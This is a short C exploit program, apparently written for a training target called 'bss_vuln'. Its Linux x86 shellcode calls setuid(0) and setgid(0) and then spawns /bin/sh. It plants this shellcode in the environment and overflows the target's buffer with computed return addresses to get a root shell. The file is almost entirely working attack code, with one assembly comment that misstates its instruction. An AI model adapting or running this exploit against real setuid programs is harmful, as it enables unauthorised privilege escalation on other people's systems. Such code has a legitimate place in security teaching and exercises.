#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
"\x31\xc0"   /*   xorl   %eax,%eax   */
"\x31\xdb"   /*   xorl   %ebx,%ebx   */
"\xb0\x17"   /*   movb   $0x17,%al   */
"\xcd\x80"   /*   int    $0x80       */
"\x33\xc0"   /*   xorl   %eax,%eax   */
"\x31\xdb"   /*   xorl   %ebx,%ebx   */
"\xb0\x2e"   /*   movb   $0x2e,%al   */
"\xcd\x80"   /*   int    $0x80       */
"\x31\xc0"   /*   xorl   %eax,%eax   */
"\x50"       /*   pushl  %eax        */
"\x68""//sh" /*   pushl  $0x68732f2f */
"\x68""/bin" /*   pushl  $0x6e69622f */
"\x89\xe3"   /*   movl   %esp,%ebp   */
"\x50"       /*   pushl  %eax        */
"\x53"       /*   pushl  %ebx        */
"\x89\xe1"   /*   movl   %esp,%ecx   */
"\x99"       /*   cltd               */
"\xb0\x0b"   /*   movb   $0xb,%al    */
"\xcd\x80";  /*   int    $0x80       */

int main()
{
  char *env[] = {shellcode, NULL};
  char buf[104];
  unsigned long ret;
  unsigned long *ptr;
  int i;

  ptr = (unsigned long*)(buf);
  ret = 0xc0000000 - strlen(shellcode) - strlen("./bss_vuln") - 6;
  for(i = 0; i < 104; i += 4) {*ptr++ = ret;}

  execle("./bss_vuln", "bss_vuln", buf, NULL, env);
}
